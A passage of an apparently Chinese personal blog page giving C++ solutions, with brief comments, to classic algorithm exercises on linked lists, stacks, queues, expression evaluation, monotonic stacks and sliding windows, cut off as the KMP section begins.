class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100005</span>;</span><br><span class="line"><span class="type">int</span> head, e[N], ne[N], idx; </span><br><span class="line"><span class="comment">//头节点， 值，下一节点，idx索引节点的编号</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    head = <span class="number">-1</span>;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_to_head</span><span class="params">(<span class="type">int</span> x  )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    ne[idx] = head;</span><br><span class="line">    head = idx;</span><br><span class="line">    idx ++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove</span><span class="params">(<span class="type">int</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ne[pos] = ne[ne[pos]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    ne[idx] = ne[pos];</span><br><span class="line">    ne[pos] = idx;</span><br><span class="line">    idx++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    cin &gt;&gt; m;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> op;</span><br><span class="line">        <span class="type">int</span> pos, x;</span><br><span class="line">        cin &gt;&gt; op;</span><br><span class="line">        <span class="keyword">if</span>(op == <span class="string">&#x27;H&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; x;</span><br><span class="line">            <span class="built_in">add_to_head</span>(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(op == <span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; pos;</span><br><span class="line">            <span class="keyword">if</span>(!pos) head = ne[head];   <span class="comment">//移除头节点</span></span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">remove</span>(pos - <span class="number">1</span>);<span class="comment">//第k个元素对应的索引为k - 1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; pos &gt;&gt; x;</span><br><span class="line">            <span class="built_in">insert</span>(x, pos <span class="number">-1</span>);<span class="comment">//第k个元素对应的索引为k - 1</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = head; i != <span class="number">-1</span>; i = ne[i]) cout &lt;&lt; e[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="827-双链表"><a href="#827-双链表" class="headerlink" title="827.双链表"></a>827.双链表</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240724153713237.png" alt="image-20240724153713237"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span> + <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> l[N], r[N], e[N];</span><br><span class="line"><span class="comment">// l表示该节点左边，r表示该节点右边</span></span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  l[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  r[<span class="number">0</span>] = <span class="number">1</span>;<span class="comment">// 第一个点的右边是 1   第二个点的左边是 0，这两个点都会随着链表变化</span></span><br><span class="line">  idx = <span class="number">2</span>; <span class="comment">//已经用掉两个节点</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// k点右边插入x</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  e[idx] = x;</span><br><span class="line">  r[idx] = r[k];</span><br><span class="line">  l[idx] = k;</span><br><span class="line">  l[r[idx]] = idx;</span><br><span class="line">  r[k] = idx;</span><br><span class="line">  idx++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove</span><span class="params">(<span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">  r[l[k]] = r[k];</span><br><span class="line">  l[r[k]] = l[k];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> m;</span><br><span class="line">  cin &gt;&gt; m;</span><br><span class="line">  <span class="built_in">init</span>();</span><br><span class="line">  <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">    string op;</span><br><span class="line">    cin &gt;&gt; op;</span><br><span class="line">    <span class="type">int</span> k, x;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&quot;R&quot;</span>) &#123;</span><br><span class="line">      cin &gt;&gt; x;</span><br><span class="line">      <span class="built_in">add</span>(l[<span class="number">1</span>], x); <span class="comment">//指向最右边的节点</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;L&quot;</span>) &#123;</span><br><span class="line">      cin &gt;&gt; x;</span><br><span class="line">      <span class="built_in">add</span>(<span class="number">0</span>, x); <span class="comment">//指向最左边的节点</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;D&quot;</span>) &#123;</span><br><span class="line">      cin &gt;&gt; k;</span><br><span class="line">      <span class="built_in">remove</span>(k + <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;IL&quot;</span>) &#123;</span><br><span class="line">      cin &gt;&gt; k &gt;&gt; x;</span><br><span class="line">      <span class="built_in">add</span>(l[k + <span class="number">1</span>], x); <span class="comment">// k点右边插入</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;IR&quot;</span>) &#123;</span><br><span class="line">      cin &gt;&gt; k &gt;&gt; x;</span><br><span class="line">      <span class="built_in">add</span>(k + <span class="number">1</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = r[<span class="number">0</span>]; i != <span class="number">1</span>; i = r[i])</span><br><span class="line">    cout &lt;&lt; e[i] &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="828-模拟栈"><a href="#828-模拟栈" class="headerlink" title="828.模拟栈"></a>828.模拟栈</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240724154052696.png" alt="image-20240724154052696"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"><span class="type">int</span> st[N];</span><br><span class="line"><span class="type">int</span> top = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">while</span>(n -- )</span><br><span class="line">    &#123;</span><br><span class="line">        string s;</span><br><span class="line">        cin &gt;&gt; s;</span><br><span class="line">        <span class="keyword">if</span>(s == <span class="string">&quot;push&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; st[++top];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s == <span class="string">&quot;query&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; st[top] &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s == <span class="string">&quot;pop&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            top--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s == <span class="string">&quot;empty&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(top == <span class="number">-1</span>)   cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">else</span>            cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3302-表达式求值"><a href="#3302-表达式求值" class="headerlink" title="3302. 表达式求值"></a>3302. 表达式求值</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240724161208859.png" alt="image-20240724161208859"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">stack&lt;<span class="type">int</span>&gt; num;</span><br><span class="line">stack&lt;<span class="type">char</span>&gt; op;</span><br><span class="line"></span><br><span class="line">unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; h&#123;&#123;<span class="string">&#x27;+&#x27;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&#x27;-&#x27;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&#x27;*&#x27;</span>, <span class="number">2</span>&#125;, &#123;<span class="string">&#x27;/&#x27;</span>, <span class="number">2</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eval</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> a = num.<span class="built_in">top</span>();</span><br><span class="line">  num.<span class="built_in">pop</span>();</span><br><span class="line">  <span class="type">int</span> b = num.<span class="built_in">top</span>();</span><br><span class="line">  num.<span class="built_in">pop</span>();</span><br><span class="line">  <span class="type">char</span> c = op.<span class="built_in">top</span>();</span><br><span class="line">  op.<span class="built_in">pop</span>();</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">    res = b + a;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    res = b - a;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">    res = b * a;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    res = b / a; <span class="comment">//注意顺序</span></span><br><span class="line"></span><br><span class="line">  num.<span class="built_in">push</span>(res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  string s;</span><br><span class="line">  cin &gt;&gt; s;</span><br><span class="line">  <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isdigit</span>(s[i])) &#123;</span><br><span class="line">      <span class="type">int</span> j = i, res = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (j &lt; s.<span class="built_in">size</span>() &amp;&amp; <span class="built_in">isdigit</span>(s[j])) &#123;</span><br><span class="line">        res = res * <span class="number">10</span> + (s[j] - <span class="string">&#x27;0&#x27;</span>); <span class="comment">//可以不借助carry实现</span></span><br><span class="line">        j++;</span><br><span class="line">      &#125;</span><br><span class="line">      i = j - <span class="number">1</span>;</span><br><span class="line">      num.<span class="built_in">push</span>(res);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">      op.<span class="built_in">push</span>(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">while</span> (op.<span class="built_in">top</span>() != <span class="string">&#x27;(&#x27;</span>) &#123;<span class="comment">//匹配到上一(</span></span><br><span class="line">        <span class="built_in">eval</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      op.<span class="built_in">pop</span>(); <span class="comment">//将&#x27;(&#x27;出栈</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (h.<span class="built_in">count</span>(s[i])) &#123;</span><br><span class="line">      <span class="keyword">while</span> (op.<span class="built_in">size</span>() &amp;&amp;</span><br><span class="line">             h[op.<span class="built_in">top</span>()] &gt;= h[s[i]]) <span class="comment">//待入栈运算符优先级低，则先计算</span></span><br><span class="line">        <span class="built_in">eval</span>();                      <span class="comment">//如 ***+ 的情况</span></span><br><span class="line">      op.<span class="built_in">push</span>(s[i]);                 <span class="comment">//操作符入栈</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (op.<span class="built_in">size</span>())</span><br><span class="line">    <span class="built_in">eval</span>();                  <span class="comment">//剩余的进行计算</span></span><br><span class="line">  cout &lt;&lt; num.<span class="built_in">top</span>() &lt;&lt; endl; <span class="comment">//输出结果</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="829-模拟队列"><a href="#829-模拟队列" class="headerlink" title="829. 模拟队列"></a>829. 模拟队列</h3><p><img src="./../../../../../AppData/Roaming/Typora/typora-user-images/image-20240724161149743.png" alt="image-20240724161149743"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100005</span>;</span><br><span class="line"><span class="type">int</span> q[N];</span><br><span class="line"><span class="type">int</span> hh = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> tt = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  string s;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    cin &gt;&gt; s;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="string">&quot;push&quot;</span>) &#123;</span><br><span class="line">      cin &gt;&gt; q[++tt];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="string">&quot;pop&quot;</span>) &#123;</span><br><span class="line">      hh++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="string">&quot;query&quot;</span>) &#123;</span><br><span class="line">      cout &lt;&lt; q[hh] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="string">&quot;empty&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (hh &gt; tt)</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="830-单调栈"><a href="#830-单调栈" class="headerlink" title="830. 单调栈"></a>830. 单调栈</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240724161827802.png" alt="image-20240724161827802"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">stack&lt;<span class="type">int</span>&gt; st;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n, tmp;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line">  st.<span class="built_in">push</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    cin &gt;&gt; tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (tmp &lt;= st.<span class="built_in">top</span>())</span><br><span class="line"></span><br><span class="line">      st.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; st.<span class="built_in">top</span>() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">    st.<span class="built_in">push</span>(tmp);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="154-滑动窗口"><a href="#154-滑动窗口" class="headerlink" title="154 滑动窗口"></a>154 滑动窗口</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240724162102272.png" alt="image-20240724162102272"></p><p>通过在队头维持当前窗口的最小值来实现滑动窗口。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1000010</span>;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n, k;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; k;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ ) cin &gt;&gt; a[i];<span class="comment">//读入数据</span></span><br><span class="line">    deque&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(q.<span class="built_in">size</span>() &amp;&amp; q.<span class="built_in">back</span>() &gt; a[i]) <span class="comment">//新进入窗口的值小于队尾元素，则队尾出队列</span></span><br><span class="line">            q.<span class="built_in">pop_back</span>();</span><br><span class="line">        q.<span class="built_in">push_back</span>(a[i]);<span class="comment">//将新进入的元素入队</span></span><br><span class="line">        <span class="keyword">if</span>(i - k &gt;= <span class="number">1</span> &amp;&amp; q.<span class="built_in">front</span>() == a[i - k])<span class="comment">//若队头是否滑出了窗口，队头出队 </span></span><br><span class="line">            q.<span class="built_in">pop_front</span>();</span><br><span class="line">        <span class="keyword">if</span>(i &gt;= k)<span class="comment">//当窗口形成，输出队头对应的值</span></span><br><span class="line">            cout &lt;&lt; q.<span class="built_in">front</span>() &lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    q.<span class="built_in">clear</span>();</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//最大值亦然</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(q.<span class="built_in">size</span>() &amp;&amp; q.<span class="built_in">back</span>() &lt; a[i]) q.<span class="built_in">pop_back</span>();</span><br><span class="line">        q.<span class="built_in">push_back</span>(a[i]);</span><br><span class="line">        <span class="keyword">if</span>(i - k &gt;= <span class="number">1</span> &amp;&amp; a[i - k] == q.<span class="built_in">front</span>()) q.<span class="built_in">pop_front</span>(); </span><br><span class="line">        <span class="keyword">if</span>(i &gt;= k) cout &lt;&lt; q.<span class="built_in">front</span>() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="831-KMP字符串"><a href="#831-KMP字符串" class="headerlink" title="831. KMP字符串"></a>831. KMP字符串</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240724163805432.png" alt="image-20240724163805432"></p><p>感觉这个记了没半小时就忘了ಥ_ಥ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 